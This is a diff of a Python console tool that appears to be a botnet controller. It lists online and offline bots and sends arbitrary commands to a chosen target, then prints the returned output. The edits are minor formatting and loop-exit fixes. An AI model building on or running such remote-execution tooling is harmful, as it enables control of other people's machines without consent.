@@ -8,7 +8,7 @@ import sys
 print("initializing communications...")
 rx = channel.Receiver()
 rx_thread = threading.Thread(target=rx.start)
-if len(sys.argv) <2 or sys.argv[1] != "nocap":
+if len(sys.argv) < 2 or sys.argv[1] != "nocap":
     rx_thread.start()
 
 
@@ -81,7 +81,7 @@ def show_bots():
     print("")
     print("Offline Bots".center(20, "-"))
     for i in offlist:
-        print("- {}; last online {} seconds ago".format(i.identifier, round(time.time()-i.last_ping)))
+        print("- {}; last online {} seconds ago".format(i.identifier, round(time.time() - i.last_ping)))
     if len(offlist) == 0:
         print("NONE")
 
@@ -157,14 +157,15 @@ def arbitrary_exec():
     send(tmp, get_target())
     print("Sent command. Waiting for reply...")
     start = time.time()
-    while time.time() - start <= 180:
+    running = True
+    while time.time() - start <= 180 and running:
         for i in rx.messages:
             if i.finalized and i.payload[0] == "r" and i.payload[5:9] == "abx:":
-                print("Command output: {}".format(i.payload[9:]))
+                print("\n--BeginCommand output--\n{}\n--End output--".format(i.payload[9:]))
                 rx.tlock.acquire()
                 rx.messages.remove(i)
                 rx.tlock.release()
-                break
+                running = False
         time.sleep(0.5)
     if input("Run another command? (Y/n)").lower() == "n":
         main_menu()
@@ -225,5 +226,6 @@ def get_target():
     print("\n\n\nThat wasn't a valid identifier. Here's the list of identifiers available:")
     show_bots()
     return get_target()
+
 
 main_menu()
